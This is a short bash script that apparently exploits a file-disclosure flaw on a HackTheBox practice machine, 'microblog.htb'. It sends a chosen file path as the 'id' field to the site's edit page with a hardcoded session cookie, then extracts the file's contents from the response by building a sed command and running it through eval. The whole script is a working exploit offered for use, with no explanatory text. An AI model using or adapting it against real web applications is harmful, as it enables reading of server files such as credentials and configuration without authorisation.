#!/bin/bash

filename=$(basename "$1")
payload=$1
curl -i -k -s "http://fady.microblog.htb/edit/index.php" -H "Cookie: username=58neigalqtetis4soiudj2lva3" -d "id=$1" -d 'txt=dfsdfsdfs' > "$filename.txt"

modified_payload=$(echo "$payload" | sed 's#/#\\/#g')
modified_payload="$modified_payload blog-indiv-content\\\\\\\">"
payload2=$(echo "sed -n 's/.*\"$modified_payload\"\(.*\)/\1/p'")

echo $payload2

eval "$payload2" "$filename.txt"



